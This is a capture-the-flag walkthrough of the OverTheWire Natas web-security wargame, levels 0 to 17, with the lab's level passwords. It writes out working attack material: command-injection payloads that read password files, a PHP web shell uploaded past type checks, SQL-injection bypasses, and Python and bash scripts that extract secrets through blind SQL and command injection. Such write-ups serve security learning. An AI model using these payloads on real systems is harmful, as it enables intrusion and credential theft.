# Natas

## Level 0

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

You can find the password for next level in the page source code.

<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

***

## Level 0 - Level 1

```
Username: natas1
Password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
URL:      http://natas1.natas.labs.overthewire.org
```

In this challenge also, you can find the password for the next level in the page source code, but you can't use right click to open the drop down menu to choose the inspect or view page source option.

So you can use the `Ctrl + shift + i` shortcut to access the Dev-Tools Inspect element tab or the `Ctrl + u` shortcut to open the page source code to get the flag.

<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

***

## Level 1 - Level 2

```
Username: natas2
Password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
URL:      http://natas2.natas.labs.overthewire.org
```

There is nothing in the page source as mentioned. But there is image named `pixel.png` located at `/files` path.

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

So I checked the /files path: [http://natas2.natas.labs.overthewire.org/files/](http://natas2.natas.labs.overthewire.org/files/).

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

In the `/files` path, there was a file named `users.txt`, which has the password for the next level.

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

***

## Level 2 - Level 3

```
Username: natas3
Password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
URL:      http://natas3.natas.labs.overthewire.org
```

Same as last level, nothing is there in the page source, but there is a comment: `No more information leaks!! Not even Google will find it this time...` , which states that not even google will find it, which is a hint to the `robots.txt` file, which has a list of paths that google is not allowed to crawl or spider. So I checked if `robots.txt` is available.

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

As I guessed, there is a secret directory named `s3cr3t`, which was mentioned in `robots.txt` file.

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

On checking this path,  there was a file named `users.txt`.

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

The `users.txt` file had the password for the next level.

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

***

## Level 3 - Level 4

```
Username: natas4
Password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
URL:      http://natas4.natas.labs.overthewire.org
```

This time the target website stated that we have to come from [http://natas5.natas.labs.overthewire.org](http://natas5.natas.labs.overthewire.org/) to access the content of the page.

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

So I intercepted the request using burpsuite and modified the [Referer URL](https://support.google.com/google-ads/answer/2382957?hl=en) from [http://natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org/) to [http://natas5.natas.labs.overthewire.org](http://natas5.natas.labs.overthewire.org/) and then sent the request and got the password for the next level in the response.

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

***

## Level 4 - Level 5

```
Username: natas5
Password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
URL:      http://natas5.natas.labs.overthewire.org
```

This time, the responded that "You are not logged in".

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

So I checked the HTTP history of burpsuite and found a cookie named `loggedin` in the response header, with a value of 0.

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

I tried modifying the value to 1 using the Dev-Tools.

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

And refreshed the site and got the password for the next level.

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

***

## Level 5 - Level 6

```
Username: natas6
Password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
URL:      http://natas6.natas.labs.overthewire.org
```

This time the page welcomed me with an input box requesting for a secret. Also there was a link "View sourcecode".

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

The link lead to `index-source.html` page, which had the logic that is behind the verification of the secret key that we enter as input. The variable `$secret`, which is used in the code is imported from the file/path `includes/secret.inc`.

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

The path `includes/secret.inc` \[ [http://natas6.natas.labs.overthewire.org/includes/secret.inc](http://natas6.natas.labs.overthewire.org/includes/secret.inc) ]  had the value for the variable `$secret`.

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

On entering the found secret value in the input, got the password for the next level.

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

***

## Level 6 - Level 7

```
Username: natas7
Password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
URL:      http://natas7.natas.labs.overthewire.org
```

This the page had two links, Home and About

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

On checking these links found nothing.

<div>

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption><p>Home Page</p></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption><p>About Page</p></figcaption></figure>

</div>

But both of the above mentioned pages were fetched using the URL Query Parameter `page`.

And on the index page [http://natas7.natas.labs.overthewire.org/](http://natas7.natas.labs.overthewire.org/), there was a hint in the source code of the page, which stated that the password for webuser `natas8` is in `/etc/natas_webpass/natas8`.

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

The URL parameter and the hint triggered me about the [LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.1-Testing\_for\_Local\_File\_Inclusion) vulnerability. On testing whether the paramter is vulnerable to LFI by entering the password file location `/etc/natas_webpass/natas8` to the `page` URL parameter \[ [http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas\_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas\_webpass/natas8) ], resulted with the contents of the password file.

<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

***

## Level 7 - Level 8

```
Username: natas8
Password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
URL:      http://natas8.natas.labs.overthewire.org
```

This time also the website welcomed me with a input requesting for secret key and also there was a link to the source code of the logic behind the secret key validation.

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

This time the secret key was encoded and the function/algorithm that is used to encode the secret key was given.&#x20;

<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's breakdown the above function into steps:

1. First, the given secret string is encoded with base\_64 encoding scheme.
2. Secondly, the resultant string from the previous step is reversed.
3. Finally, the reversed string is converted to hexadecimal.

So decode the given encoded secret key we have to perform the above mentioned steps in reverse order, i.e.,

1. First, convert the encoded secret to binary.
2. Secondly, the resultant string from the previous step is reversed.
3. Finally, the reversed string is decoded with base\_64 decoding scheme.

The above decoding steps can be performed with CyberChef.

CyberChef has a handy URL scheme that preserves data and operations, so I can link directly to the solution: [https://gchq.github.io/CyberChef/#recipe=From\_Hex('None')Reverse('Character')From\_Base64('A-Za-z0-9%2B/%3D',true,false)\&input=M2QzZDUxNjM0Mzc0NmQ0ZDZkNmMzMTU2Njk1NjMzNjI](https://gchq.github.io/CyberChef/#recipe=From\_Hex\('None'\)Reverse\('Character'\)From\_Base64\('A-Za-z0-9%2B/%3D',true,false\)\&input=M2QzZDUxNjM0Mzc0NmQ0ZDZkNmMzMTU2Njk1NjMzNjI)

<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

On giving the decoded string as the input, got the password for the next level.

<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

***

## Level 8 - Level 9

```
Username: natas9
Password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
URL:      http://natas9.natas.labs.overthewire.org
```

This time also an input field with a link to the source code.

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

On checking the source code, input keyword/string that we give is directly supplied as a parameter to the grep command, which looks out for matching strings in the `dictionary.txt` file and returns the output.

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

This logic is vulnerable to [Command Injection](https://owasp.org/www-community/attacks/Command\_Injection), since the input is directly substituted in the command and no input sanitization is performed.

So, I tried to get the password for the next level by using the following input value:

`; cat /etc/natas_webpass/natas10 ;`

Direct link to the solution:

[http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas\_webpass%2Fnatas10+%3B\&submit=Search](http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas\_webpass%2Fnatas10+%3B\&submit=Search)

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

***

## Level 9 - Level 10

```
Username: natas10
Password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
URL:      http://natas10.natas.labs.overthewire.org
```

Again an input field with a link to the source code.

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

This time,  the source code logic contains input validation using Regular Expression.

<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Breaking down the RegExp pattern:

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

This time also, the input field is vulnerable to command injection, since the input is directly substituted in the command. But this time we have to bypass the input validation.

Grep will return the entire content if we give an empty string ( "" ) as a filter. We can leverage this feature to bypass the validation by using the payload: `"" /etc/natas_webpass/natas11 #`.

If we give the above payload as the input the resultant command on the server would be:

`grep -i "" /etc/natas_webpass/natas11 #`` `~~`dictionary.txt`~~

where:

* `/etc/natas_webpass/natas11` - location of the password file.
* `#` is used to comment out the remaining command ( [PHP Comments](https://www.w3schools.com/php/php\_comments.asp) )

Direct link to solution: [http://natas10.natas.labs.overthewire.org/?needle=+%22%22+%2Fetc%2Fnatas\_webpass%2Fnatas11+%23\&submit=Search](http://natas10.natas.labs.overthewire.org/?needle=+%22%22+%2Fetc%2Fnatas\_webpass%2Fnatas11+%23\&submit=Search)

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Level 10 - Level 11

```
Username: natas11
Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
URL:      http://natas11.natas.labs.overthewire.org
```

This time we have got cookies that are encrypted with XOR scheme.

<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

The source code had the php logic that performed the XOR encryption.

<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Let's first breakdown, how the default cookie data is encrypted:

<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

1. The data is first converted to json format.
2. Next the data is encrypted using the XOR encryption by passing it to the `xor_encrypt` function.
3. Finally the encrypted data is encoded with base64 scheme.

Now lets take a look in to the XOR Cipher:

{% embed url="https://www.geeksforgeeks.org/xor-cipher/" %}
To know about XOR Cipher, check this website.
{% endembed %}

According to XOR Cipher:

1. data ( XOR ) key -> encrypted\_data
2. encrypted\_data ( XOR ) key -> data
3. data ( XOR ) encrypted\_data -> key
4. If the length of the key is less than the length of the data, the key is repeatedly used to encrypt the data.

From the above conclusions, since we know the default data, which is encrypted as cookie, and also we have the encrypted data ( the actual cookie ), we can get the key by performing XOR operation between them. Let's try this.

We can get the default data from the source code.

<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

The data given in the source code has to be converted to JSON format:

```json
{
    "showpassword": "no",
    "bgcolor": "#ffffff"
}
```

Next, we can get the cookie from the browser dev tools application tab:

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

Now we have got all the necessary data. The following php code utilizes the `xor_encrypt` function that we got from the source code to perform the XOR operation on the given data.

```php
<?
    function xor_encrypt($in) {
        $key = '{"showpassword":"no","bgcolor":"#ffffff"}'; # Default Data
        $text = $in;
        $outText = '';
    
        // Iterate through each character
        for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
        }
    
        return $outText;
    }
    
    print xor_encrypt(base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=")); # Cookie
    # Output: KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK
?>
```

From the output of the above code, we can see that the string `KNHL` is repeated again and again, which shows that the key is `KNHL`, since the length of the key is less than the length of the data, the key is repeatedly used.

Now we got the key. According to the source code, the password is shown if the value of `showpassword` is equal to `yes`.

<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

So, let's create a cookie with the value of `showpassword` as `yes`. The following code encrypts the given data using XOR encryption, encodes the result with base64 scheme and returns the cookie.

```php
<?
    function xor_encrypt($in) {
        $key = 'KNHL';
        $text = $in;
        $outText = '';
    
        // Iterate through each character
        for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
        }
    
        return $outText;
    }
    
    $cookie = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
    
    print base64_encode(xor_encrypt($cookie));
    # Output: MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
?>
```

Now we got the modified cookie, its time to grab the password. Update the cookie in the browser dev tools application tab and refresh the page.

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

***

## Level 11 - Level 12

```
Username: natas12
Password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
URL:      http://natas12.natas.labs.overthewire.org
```

This time we got an form with an option to upload images of type JPEG  with a size limit of max 1KB.

<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

Also we got the link to the source code.

<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

Before digging into the source code, I tested the funcitonality of the application by uploading a sample image of size 1KB.

<div>

<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

</div>

But the application responded that there was some error in uploading the file. I also tried to upload an PNG image and also of images with size higher than the mentioned limit, but it responded the same.

So I started to digging the source code. Let's breakdown the file upload process:

First, a random file name is generated during form submission with a  hard  coded extension `.jpg`.

<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Next, the `makeRandomPathFromFilename` function is triggered, which takes the directory name and the file name as an input. In our case the directory name is hard coded as `upload` and the file name is randomly generated by the `genRandomString` function. The value of the filename is retrieved from the incoming request data.

<div>

<figure><img src=".gitbook/assets/image (63).png" alt="" width="375"><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (64).png" alt="" width="373"><figcaption></figcaption></figure>

</div>

The `makeRandomPathFromFilename` function extracts the extension from the filename and passes it to another function `makeRandomPath`, which again generates a random filename using `genRandomString` function and appends it with the base directory and the extension, then checks whether the generated path already exists. If the generated path already exists, it again generates a new path else it returns the path.

<figure><img src=".gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

After the successful generation of the target\_path, the file size limit is verified and also it verifies that the file is successfully moved to another location successfully using the `move_uploaded_file` php function.

<figure><img src=".gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

We can see that there is no validation is performed on the input file type or extension, so I tried to upload a simple php reverse shell:

```php
// rev.php
<?php system($_REQUEST['cmd']); ?>
```

<div>

<figure><img src=".gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

</div>

The file was successfully uploaded, but the file extension has been modified since its hard coded in the code. We can change this by intercepting the upload request via burpsuite and change the extension from jpg to php.

<figure><img src=".gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

The reverse shell was successfully uploaded with the extension php. Now let's try to execute commands via our reverse shell.

<figure><img src=".gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

The reverse shell is working. Now let's retrieve the password by viewing the contents of `/etc/natas_webpass/natas13`.&#x20;

<figure><img src=".gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

***

## Level 12 - Level 13

```
Username: natas13
Password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
URL:      http://natas13.natas.labs.overthewire.org
```

This time also same form, but clearly mentioned as only images are allowed.

<figure><img src=".gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Let's take a look at the source code.

<figure><img src=".gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

Almost the same code, except this time the MIME type/Magic bytes \[ [To Know More](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) ] of the uploaded file is checked using the `exif_imagetype` function to make sure the uploaded file an image.

We can bypass this check by creating a php rev shell with prepended by the magic byte of an jpeg file.

We can create such a file using simple python script:

```python
# PHP reverse shell of type image
fh = open('shell.php', 'wb')
fh.write(b'\xFF\xD8\xFF\xE0' + b'<? passthru($_GET["cmd"]); ?>')
fh.close()
```

Upload the file generated by the above script. Remember to intercept the upload request via burpsuite and modify the hard coded jpg extension to php.

<figure><img src=".gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

Now let's retrieve the password by viewing the contents of `/etc/natas_webpass/natas14`.&#x20;

<figure><img src=".gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

***

## Level 13 - Level 14

```
Username: natas14
Password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
URL:      http://natas14.natas.labs.overthewire.org
```

This time a login form, with a link to the source code.

<figure><img src=".gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

Let's take a look at the source code.

<figure><img src=".gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

By just viewing the source code, we can find that its vulnerable to SQL Injection, since the parameters are directly substituted in the SQL query.&#x20;

We can bypass the login by using a simple payload: `" OR 1 = 1 -- -`, and we get the password for the next level.

<div>

<figure><img src=".gitbook/assets/image (79).png" alt="" width="477"><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (80).png" alt="" width="470"><figcaption></figcaption></figure>

</div>

***

## Level 14 - Level 15

```
Username: natas15
Password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
URL:      http://natas15.natas.labs.overthewire.org
```

This time we got an input field, which checks whether the given username exists and also we got the link to the source code.

<figure><img src=".gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

Let's take a look at the source code.

<figure><img src=".gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

The input field is vulnerable to SQL Injection and also we from the source code, we can identify the current database name and table name as `natas15` and `users` respectively.

I first checked whether the SQL injection works by using the same payload that we used in the last level.

<div>

<figure><img src=".gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

</div>

Next I just gave `"` as the payload, looking out for clues in error thrown in the response, but no details were disclosed in the error.

<div>

<figure><img src=".gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

</div>

Since, no details were disclosed, we have to check for blind and time based SQL injection. So, I captured the request using burpsuite and saved the request to a file to test the input field with sqlmap.

<div>

<figure><img src=".gitbook/assets/image (81).png" alt="" width="563"><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (82).png" alt="" width="563"><figcaption></figcaption></figure>

</div>

From the results of sqlmap, we can see that the input field is vulnerable to boolean-based blind SQL injection. Since we know the current database name and the table name, I directly dumped the table, in which the password for the next level is present.

<div>

<figure><img src=".gitbook/assets/image (84).png" alt="" width="563"><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (85).png" alt="" width="359"><figcaption></figcaption></figure>

</div>

***

## Level 15 - Level 16

```
Username: natas16
Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
URL:      http://natas16.natas.labs.overthewire.org
```

This time we got an input field with an link to the source code.&#x20;

<figure><img src=".gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

On checking the source code, input keyword/string that we give is directly supplied as a parameter to the grep command, which looks out for matching strings in the `dictionary.txt` file and returns the output.

<figure><img src=".gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

This time the `$key` is enclosed with quotes which means whatever special characters or command we give will be considered as a string. And also this time all types of quotes are also blacklisted.

But still the above code is vulnerable to command injection, since we can use `$()` to execute shell commands. But we have to create a payload such that we extract data using the grep command, since the input is substituted in a grep command.

We can use grep and regexp and try to match data from `/etc/natas_webpass/natas17` and extract the password by brute-forcing. For that first we need a wordlist of alphanumeric characters ( since we know that the password only contains alphanumeric characters ), which can be generated using the following command.

```bash
echo {a..z} {A..Z} {0..9} | tr ' ' "\n" > alphanumeric.txt
```

Next for brute-forcing the input, I am using [ffuf](https://github.com/ffuf/ffuf), since its fast and optimized. But before we start brute-forcing, we need to find a way to filter the response, to check whether the data is matched or not.

To do that, first we have to find a unique word, that is present in the `dictionary.txt` from which the words are filtered by the application. To do so, I searched for words containing the letter `a`. It responded me with a list of words that contains the letter `a`, from which I chose the word `Americanisms`, as it is not repeated.

<figure><img src=".gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

Now, whenever we try to grep the character from passwords file, for example we are giving the following input: `Americanisms$(grep ^b /etc/natas_webpass/natas)`, which will respond with the value `Americanisms`, since the password doesn't start with the character `b`.

Let's break down the payload: `Americanisms$(grep ^b /etc/natas_webpass/natas)`

We are using grep to lookout for words starting with `b`. If our password starts with the letter b, then the grep command will return the password prepended with the word `Americanisms` ( `Americanisms<grep_password>` ), but since our input is enclosed within quotes,&#x20;

<figure><img src=".gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

the resulting command will be,

```bash
grep -i \"Americanisms$(grep ^b /etc/natas_webpass/natas)\" dictionary.txt
```

where the string `Americanisms<grep_password>` will be searched in the `dictionary.txt`, which returns nothing since there is no string word like `Americanisms<grep_password>` in the `dictionary.txt`.

But if the password doesn't start with the character `b`, then the resulting string will be `Americanisms`, since the result of the grep command will be null as the password doesn't start with the character `b`, the string `Americanisms` will be searched in the `dictionary.txt`,  which will return the word `Americanisms`.

<figure><img src=".gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

Now we have a way to filter our response, i.e., if our response has the word `Americanisms`, then our password doesn't starts with the character we tried. If our response doesn't has the word `Americanisms`, then our password starts with the character we tried. Let's test this using ffuf:

```bash
ffuf -w alphanumeric.txt:FUZZ -u 'http://natas16.natas.labs.overthewire.org/?needle=Americanisms%24%28grep+%5EFUZZ+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'    -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Authorization: Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==' -H 'Proxy-Connection: keep-alive' -H 'Referer: http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+-E+%5Ea+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' -fr "Americanisms"
```

<figure><img src=".gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

The ffuf command successfully worked, and we have successfully found our first character of the password. To find the next character, we have to append the first character that we found to the payload this time: `Americanisms$(grep ^X /etc/natas_webpass/natas)`.

```bash
ffuf -w alphanumeric.txt:FUZZ -u 'http://natas16.natas.labs.overthewire.org/?needle=Americanisms%24%28grep+%5EXFUZZ+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'    -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Authorization: Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==' -H 'Proxy-Connection: keep-alive' -H 'Referer: http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+-E+%5Ea+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' -fr "Americanisms"
```

<figure><img src=".gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

Now we got our second character, to get the third character we have to prepend `Xk` to the command. This process repeats unitil we find the entire password. So I have created a simple bash script to automate this process:

{% code lineNumbers="true" %}
```bash
#! /bin/bash

PASSWORD=""

for i in {1..32} # Since we know the length of the password is 32
do
    PASSWORD+=$(ffuf -w alphanumeric.txt:FUZZ -u "http://natas16.natas.labs.overthewire.org/?needle=Americanisms%24%28grep+%5E"$PASSWORD"FUZZ+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'    -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Authorization: Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==' -H 'Proxy-Connection: keep-alive' -H 'Referer: http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+-E+%5Ea+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' -fr "Americanisms" -v | grep "* FUZZ:" | cut -d ':' -f 2 | tr -d ' ')
done

echo Password = $PASSWORD
```
{% endcode %}

It's time to run the script:

<figure><img src=".gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

And finally we got the password for the next level.

<figure><img src=".gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

***

## Level 16 - Level 17

```
Username: natas17
Password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
URL:      http://natas17.natas.labs.overthewire.org
```

Again, we got an input field with a link to the source code.

<figure><img src=".gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

Form taking a look at the source code we can see that the query is vulnerable to SQL injection.

<figure><img src=".gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

But all the errors that are to be thrown due to the SQL injection payloads are commented out.

<figure><img src=".gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

So we can't perform error based or boolean based SQL Injection.

So let's opt out for Time Based injection. Let's try the following payload, since we know that there is going to be a user named `natas18` in the table ( from the patterns followed in previous  levels ):

```sql
natas18" AND sleep(5) #
```

You can see that the browser responded with no errors after 5 seconds.

<figure><img src=".gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

Now, we have confirmed that there is user named `natas18`. Now we have to retrieve the password for  that particular user. To do that we are going to brute force with alphanumerice letters, trying to match the password string, like we did in the last level using regexp, but this time we are going to make use of the SQL operator LIKE.

Let's try the following payload:

```sql
natas18" AND BINARY password LIKE "a%" AND SLEEP(5) #
```

It responded immediately, which means the password doesn't start with the letter a. Let's find the first character by using a simple python script, in which we are going set the value of SLEEP to be 1 and we will filter the responses based on the response time, i.e., if the response time is greater than 1, then that is the first character of the password.

{% code lineNumbers="true" %}
```python
import requests
from requests.auth import HTTPBasicAuth
from string import *
from time import *

characters = ascii_letters + digits

password = ""

session = requests.Session()

for character in characters:
    start_time = time()

    response = session.post(
        "http://natas17.natas.labs.overthewire.org/index.php",
        auth=HTTPBasicAuth(username="natas17",
                            password="XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"),
        data={"username": 'natas18" AND BINARY password LIKE "' + character + '%" AND SLEEP(1) # '}
    )

    end_time = time()
    difference = end_time - start_time

    if difference > 1:
        password += character
        break

print("Password: ", password)
```
{% endcode %}

The above script responded with the following output, from which we have found the first letter of the password.&#x20;

<figure><img src=".gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

Now its time to fetch the entire password. The following python script will fetch the entire password based on the response time of the requests.

{% code lineNumbers="true" %}
```python
import requests
from requests.auth import HTTPBasicAuth
from string import *
from time import *

characters = ascii_letters + digits

password = ""

session = requests.Session()

while len(password) < 32:
    for character in characters:
        start_time = time()

        response = session.post(
            "http://natas17.natas.labs.overthewire.org/index.php",
            auth=HTTPBasicAuth(username="natas17",
                               password="XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"),
            data={"username": 'natas18" AND BINARY password LIKE "' +
                  "".join(password) + character + '%" AND SLEEP(1) # '}
        )

        end_time = time()
        difference = end_time - start_time

        if difference > 1:
            password += character
            break
    print("Password: ", password)
```
{% endcode %}

The password for the next level has been obtained from the output of the above script.

<figure><img src=".gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

***

## Level 17 - Level 18

```
Username: natas18
Password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
URL:      http://natas18.natas.labs.overthewire.org
```

This time we got a login page and also a link to the source code. And its mentioned that, we have to login as the admin to get the password for next level.

